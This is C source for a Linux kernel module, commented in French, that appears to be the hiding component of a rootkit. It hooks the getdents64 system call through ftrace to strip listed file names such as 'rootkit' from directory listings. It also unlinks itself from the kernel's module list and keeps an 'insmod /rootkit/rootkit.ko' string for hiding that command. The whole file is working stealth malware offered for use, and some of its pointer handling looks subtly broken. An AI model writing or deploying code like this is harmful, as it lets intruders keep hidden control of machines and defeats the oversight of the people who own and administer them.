#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/ptrace.h>
#include <linux/ftrace.h>
#include "hooking.h"
#include "hide.h"

// Structures et liste chaînée pour cacher des fichiers
struct hidden_file {
    char name[256];
    struct list_head list;
};

static LIST_HEAD(hidden_files);

void hide_add_file(const char *filename) {
    struct hidden_file *hf = kmalloc(sizeof(*hf), GFP_KERNEL);
    if (!hf) return;
    strncpy(hf->name, filename, sizeof(hf->name) - 1);
    hf->name[sizeof(hf->name) - 1] = '\0';

    list_add(&hf->list, &hidden_files);
}

static int should_hide(const char *name) {
    struct hidden_file *hf;
    list_for_each_entry(hf, &hidden_files, list) {
        if (strcmp(hf->name, name) == 0)
            return 1;
    }
    return 0;
}

// Nom du syscall hooké
static struct ftrace_hook hide_hooks[]; // Déclaration plus bas

// Pointeur vers la fonction originale
// La signature des syscalls __x64_sys_* est asmlinkage long func(const struct pt_regs *)
typedef asmlinkage long (*syscall_fn_t)(const struct pt_regs *);
static syscall_fn_t real_getdents64 = NULL;

// Notre fonction directrice pour __x64_sys_getdents64
static void notrace my_getdents64_direct(struct ftrace_regs *fregs) {
    struct pt_regs *regs = ftrace_get_regs(fregs);

    // Arguments du syscall getdents64:
    // fd = regs->di
    // dirent = regs->si
    // count = regs->dx
    int fd = (int)regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    unsigned int count = (unsigned int)regs->dx;

    // Appeler la fonction originale
    long ret = real_getdents64(regs);
    if (ret <= 0) {
        regs->ax = ret; // Valeur de retour inchangée
        return;
    }

    // On filtre maintenant le buffer 'dirent'
    // On duplique la logique de filtrage comme avant
    struct linux_dirent64 *kbuf = kmalloc(ret, GFP_KERNEL);
    struct linux_dirent64 *filtered = kmalloc(ret, GFP_KERNEL);
    if (!kbuf || !filtered) {
        kfree(kbuf);
        kfree(filtered);
        // Pas de filtrage possible, on retourne le résultat brut
        regs->ax = ret;
        return;
    }

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        kfree(filtered);
        regs->ax = ret; // Impossible de filtrer, on retourne le brut
        return;
    }

    long bpos = 0;
    long outpos = 0;
    while (bpos < ret) {
        struct linux_dirent64 *d = (void *)((char *)kbuf + bpos);
        if (!should_hide(d->d_name)) {
            size_t reclen = d->d_reclen;
            memcpy((char*)filtered + outpos, d, reclen);
            outpos += reclen;
        }
        bpos += d->d_reclen;
    }

    if (copy_to_user(dirent, filtered, outpos)) {
        // Si on échoue, on retourne le résultat initial non filtré
        outpos = ret;
    }

    kfree(kbuf);
    kfree(filtered);

    // Mettre à jour le code retour
    regs->ax = outpos;
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

// Définition des hooks
static struct ftrace_hook hide_hooks[] = {
    HOOK("__x64_sys_getdents64", my_getdents64_direct, &orig_getdents64),
    // Vous pouvez ajouter ici d'autres hooks comme __x64_sys_read
    // HOOK("__x64_sys_read", my_read_direct, &orig_read),
};

static char hide_line_substr[] = "insmod /rootkit/rootkit.ko";

static void hide_module(void) {
    struct module *mod = THIS_MODULE;
    list_del(&mod->list);
}

int init_hide(void) {
    int err = install_hooks(hide_hooks, ARRAY_SIZE(hide_hooks));
    if (err) return err;

    // On met à jour notre pointeur vers la fonction originale getdents64
    real_getdents64 = (syscall_fn_t) * (unsigned long *)hide_hooks[0].original;

    hide_module();
    hide_add_file("rootkit");

    return 0;
}

void cleanup_hide(void) {
    remove_hooks(hide_hooks, ARRAY_SIZE(hide_hooks));
}
